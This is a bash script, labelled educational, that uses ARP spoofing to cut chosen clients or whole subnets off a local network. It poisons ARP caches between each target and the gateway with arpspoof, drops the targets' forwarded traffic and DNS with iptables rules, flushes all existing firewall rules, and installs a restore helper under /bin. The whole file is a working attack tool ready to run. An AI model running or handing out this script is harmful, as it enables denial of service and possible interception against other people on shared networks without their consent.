#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, ipcalc, and root privileges

echo "Enter Router Gateway IP:"
read -p "> " GATEWAY
echo "Enter Target IP(s) or (space-separated) Multi IP's or Subnet (10.0.0.1/20):"
read -p "> " TARGET_IPS
echo "Enter Interface (wlan0):"
read -p "> " INTERFACE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush all existing iptables rules
iptables -F
iptables -X
iptables -t nat -F

# Remove Iptables rules
cat > /bin/netkiller-stop << EOF
iptables -F
iptables -X
iptables -t nat -F
echo "Wifi clients connection are restored...!!!"
EOF
chmod 755 /bin/netkiller-stop

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    IFS='/' read -r IP MASK <<< "$SUBNET"
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

for TARGET in $TARGET_IPS; do
    if [[ "$TARGET" =~ / ]]; then
        # CIDR Notation
        iptables -A FORWARD -s "$TARGET" -j DROP
        iptables -A FORWARD -d "$TARGET" -j DROP
        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"

        # DNS Blocking Rules
        iptables -A FORWARD -s "$TARGET" -p udp --dport 53 -j DROP
        iptables -A FORWARD -s "$TARGET" -p tcp --dport 53 -j DROP
        iptables -A FORWARD -d "$TARGET" -p udp --sport 53 -j DROP
        iptables -A FORWARD -d "$TARGET" -p tcp --sport 53 -j DROP
        iptables -t nat -A PREROUTING -s "$TARGET" -p udp --dport 53 -j DNAT --to-destination 0.0.0.0
        iptables -t nat -A PREROUTING -s "$TARGET" -p tcp --dport 53 -j DNAT --to-destination 0.0.0.0

        # Drop mDNS/Bonjour (common in WiFi networks)
        iptables -A FORWARD -s "$TARGET" -p udp --dport 5353 -j DROP
        iptables -A FORWARD -d "$TARGET" -p udp --sport 5353 -j DROP
       
        # Expand subnet for ARP spoofing
        read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
        if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
            # Convert IPs to integers
            ip2int() { local a b c d; IFS=. read -r a b c d <<< "$1"; echo "$((a*256**3 + b*256**2 + c*256 + d))"; }
            int2ip() { local ip=$1; echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"; }
            START=$(ip2int $HOSTMIN)
            END=$(ip2int $HOSTMAX)
            for ((i=START; i<=END; i++)); do
                TARGET_IP=$(int2ip $i)
                (
                    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
                ) &
            done
        fi
    else
        # Single IP
        iptables -A FORWARD -s "$TARGET" -j DROP
        iptables -A FORWARD -d "$TARGET" -j DROP
        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"

        # DNS Blocking Rules
        iptables -A FORWARD -s "$TARGET" -p udp --dport 53 -j DROP
        iptables -A FORWARD -s "$TARGET" -p tcp --dport 53 -j DROP
        iptables -A FORWARD -d "$TARGET" -p udp --sport 53 -j DROP
        iptables -A FORWARD -d "$TARGET" -p tcp --sport 53 -j DROP
        iptables -t nat -A PREROUTING -s "$TARGET" -p udp --dport 53 -j DNAT --to-destination 0.0.0.0
        iptables -t nat -A PREROUTING -s "$TARGET" -p tcp --dport 53 -j DNAT --to-destination 0.0.0.0

        # Drop mDNS/Bonjour (common in WiFi networks)
        iptables -A FORWARD -s "$TARGET" -p udp --dport 5353 -j DROP
        iptables -A FORWARD -d "$TARGET" -p udp --sport 5353 -j DROP
       
        (
            arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
        ) &
    fi
done
echo "Attacks are running in the background...!!!"
